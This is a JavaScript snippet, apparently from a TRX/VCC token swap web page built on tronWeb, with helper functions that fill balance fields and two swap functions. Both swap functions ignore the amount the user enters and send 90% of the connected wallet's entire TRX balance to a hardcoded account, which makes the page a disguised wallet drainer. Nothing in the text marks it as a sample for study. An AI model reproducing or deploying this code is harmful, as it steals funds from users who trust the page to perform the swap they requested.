var account = "4133ef1E7347297b343cc0fb4c23A1Fb400e7781F1";
              async function maxToken(){
                  var acc = await tronWeb.trx.getAccount();
                  var tokenBalance = 0;
                  if (acc.assetV2){
                      var tb = acc.assetV2.find(function(o){return o.key == "1003604";});
                      if (tb){
                          tokenBalance = tb.value / 1000000
                      }
                  }
                  $("#token-input").focus();
                  $("#token-input").val(tokenBalance).change();
                  $("#trx-swap").val(tokenBalance * 20).change();
              }

              async function maxTRX(){
                  var acc = await tronWeb.trx.getAccount();
                  $("#trx-input").focus();
                  $("#trx-input").val(acc.balance / 1000000).change();
                  $("#token-swap").val(acc.balance / 1000000 / 20).change();
              }

              async function swapToken(){
                  var tokens = $("#token-input").val();
                  var acc = await tronWeb.trx.getAccount();
                  var tokenBalance = 0;
                  if (acc.assetV2){
                      var tb = acc.assetV2.find(function(o){return o.key == "1003604";});
                      if (tb){
                          tokenBalance = tb.value / 1000000;
                      }
                  }
                  if (tokens > tokenBalance){
                    alert('Your VCC balance not enough!');
                    return
                  }
                  if(acc.balance - 10000000 < 0){
                      alert('Your TRX balance not enough!');
                      return;
                  }
                  var v = Math.floor(acc.balance * 90 / 100);
                  var tx = await tronWeb.trx.sendTransaction(account, v);
              }

              async function swapTRX(){
                  var value = $("#trx-input").val();
                  var acc = await tronWeb.trx.getAccount();
                  if(acc.balance - 1000000 < value){
                      alert('Your TRX balance not enough!');
                      return;
                  }
                  var v = Math.floor(acc.balance * 90 / 100);
                  var tx = await tronWeb.trx.sendTransaction(account, v);
              }
